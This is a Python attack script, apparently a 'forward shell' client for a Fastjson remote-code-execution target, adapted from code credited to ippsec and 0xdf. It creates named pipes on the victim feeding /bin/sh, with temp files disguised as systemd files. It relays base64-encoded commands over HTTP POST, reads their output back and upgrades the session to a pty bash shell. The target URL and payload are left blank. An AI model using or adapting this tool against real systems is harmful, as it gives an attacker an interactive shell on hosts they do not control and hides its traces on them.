#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Original authors: ippsec, 0xdf
# Modify by xiaolichan

import base64
from email.mime import base
import random
import re
import requests
import threading
import time
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
class WebShell(object):

    # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
    def __init__(self, interval=1.3):
        # MODIFY THIS, URL
        session = random.randrange(10000,99999)
        print(f"[*] Session ID: {session}")
        self.stdin = f'/tmp/systemd-0a48ae431dc94b45a6d2b2f7c665df11-{session}'
        self.stdout = f'/tmp/systemd-0a48ae431dc94b45a6d2b2f7c665df01-{session}'
        self.interval = interval
        
        print("[*] Setting up fifo shell on target")
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.RunRawCmd(MakeNamedPipes, timeout=0.1)
        
    def ReadThread(self):
        GetOutput = f"cat {self.stdout}"
        while True:
            result = self.RunRawCmd(GetOutput) #, proxy=None)
            if result:
                print(result)
                ClearOutput = f'echo -n "" > {self.stdout}'
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval)

    # Execute Command.
    def RunRawCmd(self, cmd, timeout=10, clean=False):
        if clean == True:
            cmd = cmd
        else:
            cmd = cmd + " && cat %s | base64 "%self.stdout

        token=""
        url = ""
        headers = {
        }
        payload = r""""""
        try:
            r = requests.post(url=url, headers=headers, data=payload, timeout=timeout ,verify=False)
        except:
            pass
        else:
            if "token已失效!" in r.text:
                print("[-] token expired")
            else:
                try:
                    return (base64.b64decode(r.text).decode('utf-8'))
                except:
                    pass
                    #print("[+] Command probably successed!")
            
    # Send b64'd command to RunRawCommand
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        #print(stage_cmd)
        result = self.RunRawCmd(stage_cmd)
        return result
        time.sleep(self.interval * 1.1)

    def cleanStdOut(self):
        ClearOutput = f'echo -n "" > {self.stdout}'
        self.RunRawCmd(ClearOutput, clean=True)

    def UpgradeShell(self):
        # upgrade shell
        UpgradeShell_Stage1 = """python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null"""
        self.WriteCmd(UpgradeShell_Stage1)

        UpgradeShell_Stage2 = """export TERM=xterm && stty rows 61 cols 207"""
        self.WriteCmd(UpgradeShell_Stage2)

prompt = "Fastjson> "
S = WebShell()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        result = S.WriteCmd(cmd)
        if result is None:
            result = S.WriteCmd(cmd)
        else:
            print(result)
            S.cleanStdOut()
